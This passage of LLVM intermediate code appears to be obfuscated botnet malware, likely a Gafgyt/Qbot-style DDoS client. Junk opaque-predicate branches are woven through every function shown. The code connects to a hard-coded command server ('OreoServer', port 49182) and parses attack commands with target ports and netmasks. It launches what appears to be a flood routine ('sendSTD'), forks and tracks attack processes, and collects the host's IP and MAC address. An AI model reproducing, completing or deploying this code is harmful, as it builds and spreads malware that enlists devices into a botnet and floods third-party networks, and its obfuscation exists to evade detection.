  %1482 = alloca i8*, align 8
  %1483 = alloca i8*, align 8
  %1484 = alloca i32, align 4
  %1485 = alloca i32, align 4
  %1486 = alloca i32, align 4
  %1487 = alloca i8*, align 8
  %1488 = alloca i32, align 4
  %1489 = alloca i32, align 4
  %1490 = alloca i8*, align 8
  %1491 = alloca i8*, align 8
  %1492 = alloca i32, align 4
  %1493 = alloca i32, align 4
  %1494 = alloca i8*, align 8
  %1495 = alloca i8*, align 8
  %1496 = alloca i32, align 4
  %1497 = alloca i32, align 4
  %1498 = alloca i8*, align 8
  %1499 = alloca i8*, align 8
  %1500 = alloca i32, align 4
  %1501 = alloca i32, align 4
  %1502 = alloca i32, align 4
  %1503 = alloca i32, align 4
  %1504 = alloca i32, align 4
  %1505 = alloca i8*, align 8
  %1506 = alloca i8*, align 8
  %1507 = alloca i32, align 4
  %1508 = alloca i32, align 4
  %1509 = alloca i32, align 4
  %1510 = alloca i32, align 4
  %1511 = alloca i32, align 4
  %1512 = alloca i32, align 4
  %1513 = alloca i32, align 4
  %1514 = alloca i8*, align 8
  %1515 = alloca i32, align 4
  %1516 = alloca i64, align 8
  store i32 %0, i32* %1472, align 4
  store i8** %1, i8*** %1473, align 8
  %1517 = load i8**, i8*** %1473, align 8
  %1518 = getelementptr inbounds i8*, i8** %1517, i64 0
  %1519 = load i8*, i8** %1518, align 8
  %1520 = call i32 @strcmp(i8* %1519, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  %1521 = icmp ne i32 %1520, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %1522 = load i8**, i8*** %12, align 8
  %1523 = getelementptr inbounds i8*, i8** %1522, i64 2
  %1524 = load i8*, i8** %1523, align 8
  %1525 = call i32 @atoi(i8* %1524) #10
  %1526 = icmp eq i32 %1525, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %112
  %1527 = load i8**, i8*** %12, align 8
  %1528 = getelementptr inbounds i8*, i8** %1527, i64 5
  %1529 = load i8*, i8** %1528, align 8
  %1530 = call i32 @atoi(i8* %1529) #10
  %1531 = icmp sgt i32 %1530, 65536
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %134
  %1532 = load i8**, i8*** %12, align 8
  %1533 = getelementptr inbounds i8*, i8** %1532, i64 5
  %1534 = load i8*, i8** %1533, align 8
  %1535 = call i32 @atoi(i8* %1534) #10
  %1536 = icmp sgt i32 %1535, 65500
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %165
  %1537 = load i8**, i8*** %12, align 8
  %1538 = getelementptr inbounds i8*, i8** %1537, i64 6
  %1539 = load i8*, i8** %1538, align 8
  %1540 = call i32 @atoi(i8* %1539) #10
  %1541 = icmp slt i32 %1540, 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %216
  store i32 %217, i32* %18, align 4
  %1542 = load i32, i32* %11, align 4
  %1543 = icmp sgt i32 %1542, 7
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %242
  store i32 %243, i32* %19, align 4
  %1544 = load i32, i32* %11, align 4
  %1545 = icmp sgt i32 %1544, 8
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %267
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %284
  store i32 %285, i32* %20, align 4
  %1546 = load i8*, i8** %13, align 8
  %1547 = call i8* @strstr(i8* %1546, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %1548 = icmp ne i8* %1547, null
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %305
  %1549 = load i8*, i8** %13, align 8
  %1550 = call i8* @strtok(i8* %1549, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1550, i8** %21, align 8
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %327
  %1551 = call i32 @listFork()
  %1552 = icmp ne i32 %1551, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %370
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %415
  %1553 = load i8**, i8*** %12, align 8
  %1554 = getelementptr inbounds i8*, i8** %1553, i64 4
  %1555 = load i8*, i8** %1554, align 8
  %1556 = call i32 @atoi(i8* %1555) #10
  %1557 = icmp sgt i32 %1556, 32
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %446
  %1558 = load i32, i32* %11, align 4
  %1559 = icmp eq i32 %1558, 8
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %508
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %525
  store i32 %526, i32* %28, align 4
  %1560 = load i8*, i8** %22, align 8
  %1561 = call i8* @strstr(i8* %1560, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %1562 = icmp ne i8* %1561, null
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %563
  %1563 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1563, i8** %29, align 8
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %601
  %1564 = load i32, i32* %11, align 4
  %1565 = icmp slt i32 %1564, 4
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %664
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %687
  %1566 = load i32, i32* %11, align 4
  %1567 = icmp slt i32 %1566, 6
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %706
  %1568 = load i8**, i8*** %12, align 8
  %1569 = getelementptr inbounds i8*, i8** %1568, i64 3
  %1570 = load i8*, i8** %1569, align 8
  %1571 = call i32 @atoi(i8* %1570) #10
  %1572 = icmp slt i32 %1571, 1
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %728
  %1573 = load i8**, i8*** %12, align 8
  %1574 = getelementptr inbounds i8*, i8** %1573, i64 5
  %1575 = load i8*, i8** %1574, align 8
  %1576 = call i32 @atoi(i8* %1575) #10
  %1577 = icmp slt i32 %1576, 1
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %754
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %800
  %1578 = load i32, i32* %11, align 4
  %1579 = icmp slt i32 %1578, 4
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %819
  %1580 = load i8**, i8*** %12, align 8
  %1581 = getelementptr inbounds i8*, i8** %1580, i64 2
  %1582 = load i8*, i8** %1581, align 8
  %1583 = call i32 @atoi(i8* %1582) #10
  %1584 = icmp slt i32 %1583, 1
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %863
  %1585 = load i8*, i8** %34, align 8
  %1586 = call i8* @strtok(i8* %1585, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1586, i8** %37, align 8
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %891
  %1587 = load i8*, i8** %34, align 8
  %1588 = load i32, i32* %35, align 4
  %1589 = load i32, i32* %36, align 4
  call void @sendSTD(i8* %1587, i32 %1588, i32 %1589)
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %912
  %1590 = load i8**, i8*** %12, align 8
  %1591 = getelementptr inbounds i8*, i8** %1590, i64 0
  %1592 = load i8*, i8** %1591, align 8
  %1593 = call i32 @strcmp(i8* %1592, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0)) #10
  %1594 = icmp ne i32 %1593, 0
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %934
  %1595 = load i32, i32* %11, align 4
  %1596 = icmp slt i32 %1595, 6
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %972
  %1597 = load i8**, i8*** %12, align 8
  %1598 = getelementptr inbounds i8*, i8** %1597, i64 6
  %1599 = load i8*, i8** %1598, align 8
  %1600 = call i32 @atoi(i8* %1599) #10
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %998
  %1601 = load i8**, i8*** %12, align 8
  %1602 = getelementptr inbounds i8*, i8** %1601, i64 5
  %1603 = load i8*, i8** %1602, align 8
  %1604 = call i32 @atoi(i8* %1603) #10
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1020
  store i32 %1021, i32* %43, align 4
  %1605 = load i8*, i8** %38, align 8
  %1606 = call i8* @strstr(i8* %1605, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %1607 = icmp ne i8* %1606, null
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1057
  %1608 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1608, i8** %44, align 8
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1115
  %1609 = load i8**, i8*** %12, align 8
  %1610 = getelementptr inbounds i8*, i8** %1609, i64 5
  %1611 = load i8*, i8** %1610, align 8
  %1612 = call i32 @atoi(i8* %1611) #10
  %1613 = icmp eq i32 %1612, -1
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1149
  %1614 = load i8**, i8*** %12, align 8
  %1615 = getelementptr inbounds i8*, i8** %1614, i64 4
  %1616 = load i8*, i8** %1615, align 8
  %1617 = call i32 @atoi(i8* %1616) #10
  %1618 = icmp sgt i32 %1617, 32
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1208
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1239
  %1619 = load i8**, i8*** %12, align 8
  %1620 = getelementptr inbounds i8*, i8** %1619, i64 8
  %1621 = load i8*, i8** %1620, align 8
  %1622 = call i32 @atoi(i8* %1621) #10
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1260
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1288
  %1623 = call i32 @listFork()
  %1624 = icmp ne i32 %1623, 0
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1316
  %1625 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %1625, i8** %53, align 8
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1334
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1363
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1381
  %1626 = load i8**, i8*** %12, align 8
  %1627 = getelementptr inbounds i8*, i8** %1626, i64 0
  %1628 = load i8*, i8** %1627, align 8
  %1629 = call i32 @strcmp(i8* %1628, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.108, i32 0, i32 0)) #10
  %1630 = icmp ne i32 %1629, 0
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1408
  %1631 = load i32*, i32** @pids, align 8
  %1632 = load i64, i64* %55, align 8
  %1633 = getelementptr inbounds i32, i32* %1631, i64 %1632
  %1634 = load i32, i32* %1633, align 4
  %1635 = icmp ne i32 %1634, 0
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1452
  br label %originalBB174
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @x.75
  %12 = load i32, i32* @y.76
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  %21 = sext i32 %20 to i64
  %22 = icmp eq i64 %21, 1
  %23 = load i32, i32* @x.75
  %24 = load i32, i32* @y.76
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* @currentServer, align 4
  br label %35

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @currentServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @currentServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %31
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %37 = load i32, i32* @currentServer, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1 x i8*], [1 x i8*]* @OreoServer, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcpy(i8* %36, i8* %40) #2
  store i32 49182, i32* %3, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #10
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #10
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #10
  store i32 %49, i32* %3, align 4
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #10
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %35
  %53 = load i32, i32* @x.75
  %54 = load i32, i32* @y.76
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %52
  %61 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %61, i32* @mainCommSock, align 4
  %62 = load i32, i32* @mainCommSock, align 4
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %64 = load i32, i32* %3, align 4
  %65 = call i32 @connectTimeout(i32 %62, i8* %63, i32 %64, i32 30)
  %66 = icmp ne i32 %65, 0
  %67 = load i32, i32* @x.75
  %68 = load i32, i32* @y.76
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br i1 %66, label %92, label %75

; <label>:75:                                     ; preds = %originalBBpart29
  %76 = load i32, i32* @x.75
  %77 = load i32, i32* @y.76
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %75
  store i32 1, i32* %1, align 4
  %84 = load i32, i32* @x.75
  %85 = load i32, i32* @y.76
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %93

; <label>:92:                                     ; preds = %originalBBpart29
  store i32 0, i32* %1, align 4
  br label %93

; <label>:93:                                     ; preds = %92, %originalBBpart213
  %94 = load i32, i32* %1, align 4
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %10
  %95 = load i32, i32* @currentServer, align 4
  %_ = shl i32 %95, 1
  %_1 = sub i32 0, %95
  %gen = add i32 %_1, 1
  %_2 = sub i32 %95, 1
  %gen3 = mul i32 %_2, 1
  %_4 = shl i32 %95, 1
  %_5 = sub i32 %95, 1
  %gen6 = mul i32 %_5, 1
  %96 = add nsw i32 %95, 1
  %97 = sext i32 %96 to i64
  %98 = icmp eq i64 %97, 1
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %52
  %99 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %99, i32* @mainCommSock, align 4
  %100 = load i32, i32* @mainCommSock, align 4
  %101 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %102 = load i32, i32* %3, align 4
  %103 = call i32 @connectTimeout(i32 %100, i8* %101, i32 %102, i32 30)
  %104 = icmp ne i32 %103, 0
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %75
  store i32 1, i32* %1, align 4
  br label %originalBB11
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = load i32, i32* @x.77
  %2 = load i32, i32* @y.78
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [4096 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.ifreq, align 8
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %20, i32* %10, align 4
  %21 = load i32, i32* %10, align 4
  %22 = icmp eq i32 %21, -1
  %23 = load i32, i32* @x.77
  %24 = load i32, i32* @y.78
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %48

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.77
  %33 = load i32, i32* @y.78
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 0, i32* %9, align 4
  %40 = load i32, i32* @x.77
  %41 = load i32, i32* @y.78
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %181

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 16, i32 4, i1 false)
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0)) #2
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %53 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %52, i32 0, i32 0
  store i32 %51, i32* %53, align 4
  %54 = call zeroext i16 @htons(i16 zeroext 53) #13
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %54, i16* %55, align 2
  %56 = load i32, i32* %10, align 4
  %57 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 16)
  store i32 %58, i32* %12, align 4
  %59 = load i32, i32* %12, align 4
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %48
  store i32 0, i32* %9, align 4
  br label %181

; <label>:62:                                     ; preds = %48
  store i32 16, i32* %14, align 4
  %63 = load i32, i32* %10, align 4
  %64 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %65 = call i32 @getsockname(i32 %63, %struct.sockaddr* %64, i32* %14) #2
  store i32 %65, i32* %12, align 4
  %66 = load i32, i32* %12, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %62
  store i32 0, i32* %9, align 4
  br label %181

; <label>:69:                                     ; preds = %62
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %71 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %70, i32 0, i32 0
  %72 = load i32, i32* %71, align 4
  store i32 %72, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %73 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.110, i32 0, i32 0), i32 0)
  store i32 %73, i32* %15, align 4
  br label %74

; <label>:74:                                     ; preds = %95, %69
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %76 = load i32, i32* %15, align 4
  %77 = call i8* @fdgets(i8* %75, i32 4096, i32 %76)
  %78 = icmp ne i8* %77, null
  br i1 %78, label %79, label %97

; <label>:79:                                     ; preds = %74
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %81 = call i8* @strstr(i8* %80, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0)) #10
  %82 = icmp ne i8* %81, null
  br i1 %82, label %83, label %95

; <label>:83:                                     ; preds = %79
  %84 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  store i8* %84, i8** %17, align 8
  br label %85

; <label>:85:                                     ; preds = %90, %83
  %86 = load i8*, i8** %17, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp ne i32 %88, 9
  br i1 %89, label %90, label %93

; <label>:90:                                     ; preds = %85
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %17, align 8
  br label %85

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %17, align 8
  store i8 0, i8* %94, align 1
  br label %97

; <label>:95:                                     ; preds = %79
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 4096, i32 16, i1 false)
  br label %74

; <label>:97:                                     ; preds = %93, %74
  %98 = load i32, i32* %15, align 4
  %99 = call i32 @close(i32 %98)
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %101 = load i8, i8* %100, align 16
  %102 = icmp ne i8 %101, 0
  br i1 %102, label %103, label %178

; <label>:103:                                    ; preds = %97
  %104 = load i32, i32* @x.77
  %105 = load i32, i32* @y.78
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  %112 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 0
  %113 = bitcast %union.anon.5* %112 to [16 x i8]*
  %114 = getelementptr inbounds [16 x i8], [16 x i8]* %113, i32 0, i32 0
  %115 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %116 = call i8* @strcpy(i8* %114, i8* %115) #2
  %117 = load i32, i32* %10, align 4
  %118 = call i32 (i32, i64, ...) @ioctl(i32 %117, i64 35111, %struct.ifreq* %19) #2
  store i32 0, i32* %18, align 4
  %119 = load i32, i32* @x.77
  %120 = load i32, i32* @y.78
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %127

; <label>:127:                                    ; preds = %174, %originalBBpart28
  %128 = load i32, i32* @x.77
  %129 = load i32, i32* @y.78
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %127
  %136 = load i32, i32* %18, align 4
  %137 = icmp slt i32 %136, 6
  %138 = load i32, i32* @x.77
  %139 = load i32, i32* @y.78
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %137, label %146, label %177

; <label>:146:                                    ; preds = %originalBBpart212
  %147 = load i32, i32* @x.77
  %148 = load i32, i32* @y.78
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %146
  %155 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %156 = bitcast %union.anon.6* %155 to %struct.sockaddr*
  %157 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %156, i32 0, i32 1
  %158 = getelementptr inbounds [14 x i8], [14 x i8]* %157, i32 0, i32 0
  %159 = load i32, i32* %18, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i8, i8* %158, i64 %160
  %162 = load i8, i8* %161, align 1
  %163 = load i32, i32* %18, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %164
  store i8 %162, i8* %165, align 1
  %166 = load i32, i32* @x.77
  %167 = load i32, i32* @y.78
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %174

; <label>:174:                                    ; preds = %originalBBpart216
  %175 = load i32, i32* %18, align 4
  %176 = add nsw i32 %175, 1
  store i32 %176, i32* %18, align 4
  br label %127

; <label>:177:                                    ; preds = %originalBBpart212
  br label %178

; <label>:178:                                    ; preds = %177, %97
  %179 = load i32, i32* %10, align 4
  %180 = call i32 @close(i32 %179)
  br label %181

; <label>:181:                                    ; preds = %178, %68, %61, %originalBBpart24
  %182 = load i32, i32* %9, align 4
  ret i32 %182

originalBBalteredBB:                              ; preds = %originalBB, %0
  %183 = alloca i32, align 4
  %184 = alloca i32, align 4
  %185 = alloca %struct.sockaddr_in, align 4
  %186 = alloca i32, align 4
  %187 = alloca %struct.sockaddr_in, align 4
  %188 = alloca i32, align 4
  %189 = alloca i32, align 4
  %190 = alloca [4096 x i8], align 16
  %191 = alloca i8*, align 8
  %192 = alloca i32, align 4
  %193 = alloca %struct.ifreq, align 8
  %194 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %194, i32* %184, align 4
  %195 = load i32, i32* %184, align 4
  %196 = icmp eq i32 %195, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
